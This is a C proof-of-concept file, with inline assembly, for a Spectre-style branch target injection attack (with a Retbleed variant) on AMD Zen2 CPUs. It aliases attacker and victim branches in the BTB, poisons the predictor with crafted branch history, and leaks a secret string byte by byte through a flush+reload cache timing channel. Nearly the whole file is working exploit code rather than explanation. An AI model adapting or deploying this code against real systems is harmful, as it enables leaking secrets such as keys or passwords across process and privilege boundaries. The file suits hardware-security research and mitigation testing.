/* This dummy PoC is tested on an AMD Threadripper Zen2
 * and builds on the Spectre v1 PoC written in the
 * Appendix C of the Spectre paper in
 * https://spectreattack.com/spectre.pdf
 */

/* Required for CPU affinity functions */
#define _GNU_SOURCE
#include <sched.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <x86intrin.h>
#include "utils.h"
#include <sys/mman.h>
#include <unistd.h>

#include <sys/prctl.h>
#include <linux/prctl.h>

/* The rdtscp in itself takes about 60 cycles on Zen2 */
#define CACHE_HIT_THRESHOLD 80
/* Covert channel */
#define STRIDE_BITS 9
#define ELEMENT_PADDING 1<<STRIDE_BITS
/* The number of characters in the ASCII space */
#define NUM_ELEMENTS 256
uint8_t covert_channel[NUM_ELEMENTS * ELEMENT_PADDING];

#define RET 0xC3

char *secret = "L Lag gaye";
char *dummy = "$$";

void malicious_target();
 __asm__ (
      /* Label for the infinite loop (executed only speculatively) */
      "malicious_target:\n"
      /* Move a byte from the address pointed to by 'secret_ptr' into EAX
       * zero-extending it.
       */
      "movzb (%rdi), %eax\n"
      /* Shift the value in RAX left by 9 bits (multiply by 512). */
      "shl $9, %rax\n"
      /* Add the value of 'covert_channel_ptr' to RAX. */
      "add %rsi, %rax\n"
      /* Move the value at the address pointed to by RAX into RBX. */
      "movq (%rax), %rbx\n"
      /* When specualting, stop here. */
      "lfence\n"
      "jmp flush\n"
 );

void benign_target();
asm (
  "benign_target:\n"
  /* Stop here on speculation to prevent any other side effects. */
  "lfence\n"
  "jmp measure\n"
);

/* These two addresses are carefully chosen to alias in the BTB. */
#define VICTIM_BRANCH_ADDRESS 0x41bababababf
#define ATTACKER_BRANCH_ADDRESS (VICTIM_BRANCH_ADDRESS ^ 0x20020000)

void flush();
void measure();
/* The instructions are relocated at runtime to
 * addresses that collide in the BTB. The other
 * alternative would be to place them in an assembly file
 * and use a linker script.
 */
void victim_insns();
void victim_insns__end();
asm (
  ".align 0x1000\n"
  "victim_insns:\n"
#ifdef RETBLEED
  "push (%r11)\n"
  "ret\n"
#else
  "jmp *(%r11)\n"
#endif
  "victim_insns__end:\n"
);


void attacker_insns();
void attacker_insns__end();
asm (
  ".align 0x1000\n"
  "attacker_insns:\n"
  /* Why the NOP?
   *
   * The last byte of the operation is likely used to index
   * the predictor.
   *
   * 0000000000006000 <attacker_insns>:
   * 6000:       90                      nop
   * 6001:       41 ff 23                jmp    *(%r11)
   *
   * 0000000000005000 <victim_insns>:
   * 5000:       41 ff 33                push   (%r11)
   * 5003:       c3                      ret
   *
   * The nop put's the last byte of the jmp *(r11) to be at the same offset as the ret.
   */
#ifdef RETBLEED
  "nop\n"
#endif
  "jmp *(%r11)\n"
  "attacker_insns__end:\n"
);

void branch_history_target();
asm (
".align 0x2000\n"
"branch_history_target:\n"
"ret\n"
);

#define BRANCH_HISTORY_STEPS 33


static inline void flush_covert_channel() {
  for (int i = 0; i < NUM_ELEMENTS; i++)
    _mm_clflush(&covert_channel[i * ELEMENT_PADDING]);
}

void do_bti_and_read_byte(char *secret_addr, char secret_value[2],
                          int score[2]) {
  volatile int result;
  int hits[NUM_ELEMENTS];
  int winner, runner_up;

  uint64_t branch_history[BRANCH_HISTORY_STEPS] = {(uint64_t)branch_history_target};

  for (int i = 0; i < BRANCH_HISTORY_STEPS; i++)
    branch_history[i] = (uint64_t)branch_history_target;

  void (*target)(void *, void *) = NULL;
  void *pointer_to_target = (void *)(&target);

  for (int i = 0; i < NUM_ELEMENTS; i++) {
    hits[i] = 0;
    covert_channel[i * ELEMENT_PADDING] = 0;
  }

  for (int iter = 0; iter < 1000; iter++) {
    /* Clear the cache so that a hit in the covert channel is
     * can be measured as a side channel.
     */
    flush_covert_channel();
    target = malicious_target;

    __asm__ volatile(
      /* Move the value of 'secret' into register RDI (first argument). */
      "mov %[leak_addr], %%rdi\n"
      /* Move the value of 'covert_channel' into register RSI (second argument).
        */
      "mov %[covert_channel], %%rsi\n"
      /* Invalidate the cache line containing the address pointed to by
        * `pointer_to_target`.
        */
      "clflush (%[pointer_to_target])\n"
      /* Load the value at the address pointed to by `pointer_to_target` into
        * register RAX.
        */
      "mov (%[pointer_to_target]), %%r11\n"
      /* create some execution history for the TAGE predictions */
      "push %[icall]\n"
      "mov %[branch_history], %%r10 \n\t"
      /* Clear any TAGE predictions based on history */
      ".rept " xstr(BRANCH_HISTORY_STEPS) "\n\t"
      "pushq (%%r10)\n\t"
      "add $8, %%r10\n\t"
      ".endr\n\t"
      "ret\n"
      : /* No output operands */
      : [pointer_to_target] "r"(&pointer_to_target),
        [leak_addr] "r"(dummy),
        [covert_channel] "r"(covert_channel),
        [branch_history] "r" (branch_history),
        [icall] "r" (ATTACKER_BRANCH_ADDRESS)
      : "rax", "rdi", "rsi", "r11", "rax");

      asm("flush:\n");
      flush_covert_channel();

      target = benign_target;
      __asm__ volatile(
        /* Move the value of 'secret' into register RDI (first argument). */
        "mov %[leak_addr], %%rdi\n"
        /* Move the value of 'covert_channel' into register RSI (second argument).
          */
        "mov %[covert_channel], %%rsi\n"
        /* Invalidate the cache line containing the address pointed to by
          * `pointer_to_target`.
          */
        "clflush (%[pointer_to_target])\n"
        /* Load the value at the address pointed to by `pointer_to_target` into
          * register RAX.
          */
        "mov (%[pointer_to_target]), %%r11\n"
        /* create some execution history for the TAGE predictions */
        "push %[icall]\n"
        "mov %[branch_history], %%r10 \n\t"
        /* Clear any TAGE predictions based on history */
        ".rept " xstr(BRANCH_HISTORY_STEPS) "\n\t"
        "pushq (%%r10)\n\t"
        "add $8, %%r10\n\t"
        ".endr\n\t"
        "ret\n"
        : /* No output operands */
        : [pointer_to_target] "r"(&pointer_to_target),
          [leak_addr] "r"(secret_addr),
          [covert_channel] "r"(covert_channel),
          [branch_history] "r" (branch_history),
          [icall] "r" (VICTIM_BRANCH_ADDRESS)
        : "rax", "rdi", "rsi", "r11", "rax");

    asm("measure:\n");

    for (int i = 0; i < NUM_ELEMENTS; i++) {
      uint64_t start, elapsed;
      int mix_i;
      uint8_t *addr;
      /* This trick of mixing the indices to evade stride prediction
       * as mentioned in the example in Appendix C.
       */
      mix_i = ((i * 167) + 13) & 255;
      addr = &covert_channel[mix_i * ELEMENT_PADDING];
      start = __rdtsc();
      /* result needs to be volatile so that it does not get optimized away */
      result = *addr;
      /* Wait for the load to finish */
      _mm_mfence();
      elapsed = __rdtsc() - start;
      if (elapsed <= CACHE_HIT_THRESHOLD)
        hits[mix_i]++;
    }

    winner = -1, runner_up = -1;
    for (int i = 0; i < NUM_ELEMENTS; i++) {
      if (winner < 0 || hits[i] >= hits[winner]) {
        runner_up = winner;
        winner = i;
      } else if (runner_up < 0 || hits[i] >= hits[runner_up]) {
        runner_up = i;
      }
    }
    if ((hits[winner] >= 2 * hits[runner_up] + 5) ||
        (hits[winner] == 2 && hits[runner_up] == 0)) {
      break;
    }
  if (prctl(PR_SET_SPECULATION_CTRL, PR_SPEC_INDIRECT_BRANCH, PR_SPEC_DISABLE, 0, 0) == -1) {
      printf("prctl failed\n");
  }
  }

  secret_value[0] = (char)winner;
  score[0] = hits[winner];
  secret_value[1] = (char)runner_up;
  score[1] = hits[runner_up];
  /* use the result, __maybe_unused could be added as well */
  result++;
}

int main() {
  /* Pin to CPU 0 */
  set_cpu_affinity(24);

  size_t victim_insns__size = victim_insns__end - victim_insns;
  size_t attacker_insns__size = attacker_insns__end - attacker_insns;

  if (!check_zen2_btb_collision(VICTIM_BRANCH_ADDRESS, ATTACKER_BRANCH_ADDRESS)) {
    printf("hard coded addresses for victim = %lx, attacker = %lx do not alias in the BTB\n",
      VICTIM_BRANCH_ADDRESS, ATTACKER_BRANCH_ADDRESS);
      return -1;
  }
  // TODO: Cleanup this, make these into functions.
  map_or_die((void*)(VICTIM_BRANCH_ADDRESS & ~0xfff), PG_ROUND((VICTIM_BRANCH_ADDRESS & 0xfff) +
  victim_insns__size), PROT_RWX, MMAP_FLAGS, -1, 0);

  map_or_die((void*)(ATTACKER_BRANCH_ADDRESS & ~0xfff), PG_ROUND((ATTACKER_BRANCH_ADDRESS & 0xfff) +
  attacker_insns__size), PROT_RWX, MMAP_FLAGS, -1, 0);

  memcpy((void *)VICTIM_BRANCH_ADDRESS, victim_insns, victim_insns__size);
  memcpy((void *)ATTACKER_BRANCH_ADDRESS, attacker_insns, attacker_insns__size);

  char result[2];
  int score[2];
  int probe_len = strlen(secret);
  char *probe_addr = secret;

  printf("Reading %d bytes starting at %p:\n", probe_len, probe_addr);
  while (--probe_len >= 0) {
    printf("reading %p...", probe_addr);
    do_bti_and_read_byte(probe_addr++, result, score);
    printf("%s: (hits=%d vs %d)",
           (score[0] > 0 && score[0] >= 2 * score[1] ? "success" : "unclear"),
           score[0], score[1]);
    printf("0x%02X='%c'\n", result[0],
           (result[0] > 31 && result[0] < 127 ? result[0] : '?'));
  }
  printf("\n");
}
